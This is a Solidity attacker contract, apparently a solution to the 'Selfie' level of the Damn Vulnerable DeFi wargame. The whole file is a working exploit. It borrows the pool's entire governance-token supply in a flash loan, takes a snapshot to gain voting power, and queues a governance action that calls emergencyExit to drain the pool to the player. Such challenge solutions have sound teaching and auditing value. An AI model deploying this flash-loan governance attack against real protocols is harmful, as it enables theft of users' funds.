// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

import  "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker  is IERC3156FlashBorrower {

    using Strings for uint256;

    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot snapshot;
    address playerAddress;

    constructor(address selfiePoolAddress) {

        selfiePool = SelfiePool(selfiePoolAddress);

        snapshot = DamnValuableTokenSnapshot(address(selfiePool.token()));
        simpleGovernance =  selfiePool.governance();

    }


    function attack(address selfiePoolAddress) external {

        playerAddress = msg.sender;

        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)),address(snapshot),selfiePool.maxFlashLoan(address(snapshot)),"0x");

    }

     /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "IERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){

        // generate new snapshotId, which can make this address have enough votes
        snapshot.snapshot(); 

        address target = address(selfiePool); // skip the InvalidTarget() check
        uint128 value = 0; 
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)",playerAddress); // call this address. then call emergencyExit by simpleGovernance
        // make an action, which make the simpleGovernance call this function:emergencyExit(address). transferring all snapshot Token to player(msg.sender)
        simpleGovernance.queueAction(target,value,data);

       
        // approve lender take back the borrowed token
        snapshot.approve(address(selfiePool),snapshot.balanceOf(address(this)));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }
   
}
